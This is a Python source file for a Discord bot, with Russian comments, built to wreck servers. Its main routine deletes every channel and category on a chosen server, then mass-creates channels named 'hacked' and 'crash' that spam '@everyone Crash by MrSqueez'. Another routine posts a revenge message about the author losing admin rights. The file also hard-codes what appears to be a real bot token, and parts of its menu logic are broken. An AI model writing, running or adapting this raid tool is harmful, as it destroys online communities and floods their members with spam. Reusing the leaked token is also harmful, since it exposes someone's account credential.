import discord
from discord.ext import commands
import asyncio

TOKEN = 'MTE4ODM4Nzg0NzE3MDk2NTYyNA.G0vGCj.rpnloLTL74zHHhyhFKFauiNyxzzTsTlU6F44lM'

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

stop_flag = False  # Флаг для остановки действий

async def perform_action_1(guild_id):
    global stop_flag

    # Запрос ID сервера
    guild_id = int(input("Введите ID сервера: "))
    guild = bot.get_guild(guild_id)

    if not guild:
        print("Сервер не найден.")
        return

    # Удаление всех категорий и каналов на сервере
    for category in guild.categories:
        await category.delete()
    for channel in guild.channels:
        await channel.delete()

    # Создание категории и каналов
    category_hacked = await guild.create_category('hacked')
    num_channels_per_category = 50
    num_categories = len(guild.categories) // num_channels_per_category + 1

    for i in range(1, num_categories + 1):
        category = await guild.create_category(f'hacked {i}')

        for j in range(1, num_channels_per_category + 1):
            channel_name = f'crash {j}'
            channel = await category.create_text_channel(channel_name)
            await channel.send("@everyone Crash by MrSqueez")

    print('Шаблон "Игровой сервер" применен.')
    stop_flag = False  # Сброс флага

async def create_gaming_template(guild):
    await perform_action_1(guild)

# Add other functions and the rest of the code as needed...

@bot.event
async def on_ready():
    print(f'We have logged in as {bot.user}')
    for guild in bot.guilds:
        await main_menu(guild)

# Add other functions like create_crash_template, create_templates_menu, create_roblox_trade_template, main_menu, etc.

async def create_crash_template(guild):
    # Создание категории и канала
    category = await guild.create_category("Привет")
    channel = await category.create_text_channel("зачем")

    # Отправка сообщения в канал
    await channel.send("А вот нехуй было меня снимать с админки by MrSqueez")

    print('Шаблон "Краш" применен.')

async def create_templates_menu(guild):
    global stop_flag

    while True:
        print("Выберите действие:")
        print("3. Создать канал")
        print("4. Переименовать канал")
        print("5. Удалить канал")
        print("6. Удалить категорию")
        print("7. Удалить сообщение")
        print("8. Удалить все каналы и категории")
        print("9. Написать сообщение")
        print("10. Остановить действие")
        print("11. Выход")

        action = input("Введите число (3-11): ")

        if action == "3":
            await create_channel(guild)
        elif action == "4":
            await rename_channel(guild)
        elif action == "5":
            await delete_channel(guild)
        elif action == "6":
            await delete_category(guild)
        elif action == "7":
            await delete_message(guild)
        elif action == "8":
            await delete_all_channels_and_categories(guild)
        elif action == "9":
            await send_message(guild)
        elif action == "10":
            stop_flag = True  # Установка флага остановки
        elif action == "11":
            await bot.close()
        else:
            print("Неверный выбор. Выход.")
            await bot.close()

# Add other functions...

async def create_roblox_trade_template(guild):
    # Реализуйте создание сервера трейдов роблокс
    pass

async def main_menu(guild):
    global stop_flag

    while True:
        print("Выберите действие:")
        print("1. Запуск удаления и создания категорий и каналов")
        print("2. Создать категорию")
        print("3. Создать канал")
        print("4. Переименовать канал")
        print("5. Удалить канал")
        print("6. Удалить категорию")
        print("7. Удалить сообщение")
        print("8. Удалить все каналы и категории")
        print("9. Написать сообщение в указанный канал")
        print("10. Остановить действие")
        print("11. Выход")

        action = input("Введите число (1-11): ")

        if action == "1":
            await perform_action_1(guild)
        elif action == "2":
            await create_category(guild)
        elif action == "3":
            await create_channel(guild)
        elif action == "4":
            await rename_channel(guild)
        elif action == "5":
            await delete_channel(guild)
        elif action == "6":
            await delete_category(guild)
        elif action == "7":
            await delete_message(guild)
        elif action == "8":
            await delete_all_channels_and_categories(guild)
        elif action == "9":
            await send_message_to_channel(guild)
        elif action == "10":
            stop_flag = True  # Установка флага остановки
        elif action == "11":
            await bot.close()
        else:
            print("Неверный выбор. Выход.")
            await bot.close()

# Add the remaining functions...

async def create_category(guild):
    # Запрос ID сервера
    guild_id = int(input("Введите ID сервера: "))
    category_name = input("Введите название категории: ")

    guild = bot.get_guild(guild_id)
    if guild:
        await guild.create_category(category_name)
        print(f"Категория '{category_name}' создана.")
    else:
        print("Сервер не найден.")
    await main_menu(guild)

# Add other functions like create_channel, rename_channel, delete_channel, delete_category,
# delete_message, send_message, delete_all_channels_and_categories, and others as needed...

async def create_channel(guild):
    # Запрос ID сервера
    guild_id = int(input("Введите ID сервера: "))
    category_id_input = input("Введите ID категории (или 0, если без категории): ")
    channel_name = input("Введите название канала: ")

    try:
        category_id = int(category_id_input)
    except ValueError:
        print("Неверный формат ID категории.")
        await main_menu(guild)
        return

    guild = bot.get_guild(guild_id)
    if guild:
        category = None
        if category_id != 0:
            category = discord.utils.get(guild.categories, id=category_id)
            if not category:
                print("Категория не найдена.")
                await main_menu(guild)
                return

        await guild.create_text_channel(channel_name, category=category)
        print(f"Канал '{channel_name}' создан.")
    else:
        print("Сервер не найден.")
    await main_menu(guild)

async def rename_channel(guild):
    # Запрос ID сервера
    guild_id = int(input("Введите ID сервера: "))
    channel_id = int(input("Введите ID канала: "))
    new_name = input("Введите новое название канала: ")

    guild = bot.get_guild(guild_id)
    if guild:
        channel = discord.utils.get(guild.channels, id=channel_id)
        if channel:
            await channel.edit(name=new_name)
            print(f"Канал переименован в '{new_name}'.")
        else:
            print("Канал не найден.")
    else:
        print("Сервер не найден.")
    await main_menu(guild)

async def delete_channel(guild):
    # Запрос ID сервера
    guild_id = int(input("Введите ID сервера: "))
    channel_id = int(input("Введите ID канала: "))

    guild = bot.get_guild(guild_id)
    if guild:
        channel = discord.utils.get(guild.channels, id=channel_id)
        if channel:
            await channel.delete()
            print("Канал удален.")
        else:
            print("Канал не найден.")
    else:
        print("Сервер не найден.")
    await main_menu(guild)

async def delete_category(guild):
    # Запрос ID сервера
    guild_id = int(input("Введите ID сервера: "))
    category_id = int(input("Введите ID категории: "))

    guild = bot.get_guild(guild_id)
    if guild:
        category = discord.utils.get(guild.categories, id=category_id)
        if category:
            await category.delete()
            print("Категория удалена.")
        else:
            print("Категория не найдена.")
    else:
        print("Сервер не найден.")
    await main_menu(guild)

async def delete_all_channels_and_categories(guild):
    # Удаление всех каналов и категорий на сервере
    for category in guild.categories:
        await category.delete()
    for channel in guild.channels:
        await channel.delete()
    print("Все каналы и категории удалены.")
    await main_menu(guild)

async def delete_message(guild):
    # Запрос ID канала
    channel_id = int(input("Введите ID канала: "))
    message_id = int(input("Введите ID сообщения: "))

    channel = bot.get_channel(channel_id)
    if channel:
        try:
            message = await channel.fetch_message(message_id)
            await message.delete()
            print("Сообщение удалено.")
        except discord.NotFound:
            print("Сообщение не найдено.")
    else:
        print("Канал не найден.")
    await main_menu(guild)

async def send_message(guild):
    # Запрос ID канала
    channel_id = int(input("Введите ID канала: "))
    content = input("Введите текст сообщения: ")

    channel = bot.get_channel(channel_id)
    if channel:
        await channel.send(content)
        print("Сообщение отправлено.")
    await main_menu(guild)

async def send_message_to_channel(guild):
    # Запрос ID канала
    channel_id = int(input("Введите ID канала: "))
    content = input("Введите текст сообщения: ")

    channel = bot.get_channel(channel_id)
    if channel:
        await channel.send(content)
        print("Сообщение отправлено.")
    await main_menu(guild)

# Add other functions as needed...

asyncio.run(bot.start(TOKEN))
